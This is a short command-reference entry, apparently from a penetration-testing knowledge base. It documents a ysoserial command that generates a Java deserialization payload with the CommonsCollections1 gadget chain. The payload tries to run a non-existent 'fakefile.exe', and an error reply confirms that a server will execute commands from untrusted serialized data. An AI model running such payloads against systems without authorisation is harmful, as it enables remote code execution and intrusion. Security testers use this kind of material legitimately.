---
id: cmd-ysoserial-fakefile
data: >-
  java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' >
  serialdata
tags:
  - payload-gen
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.608Z'
verified: false
validated: true
submitted: true
---
# ysoserial-generate-commonscollections-fakefile

## Command

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' > serialdata
```

## Description

Generates a test payload to attempt execution of a non-existent file, used to verify deserialization by checking for Windows error responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CommonsCollections1 | Gadget chain | Yes |
| 'fakefile.exe' | Non-existent command to trigger error | Yes |
| > serialdata | Output redirection | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' > serialdata
```

## Expected Output

Binary data in serialdata; upon server execution, response includes 'The system cannot find the file specified'.

## Related

- [[Related Procedure: Verify Command Execution via Response Analysis]]
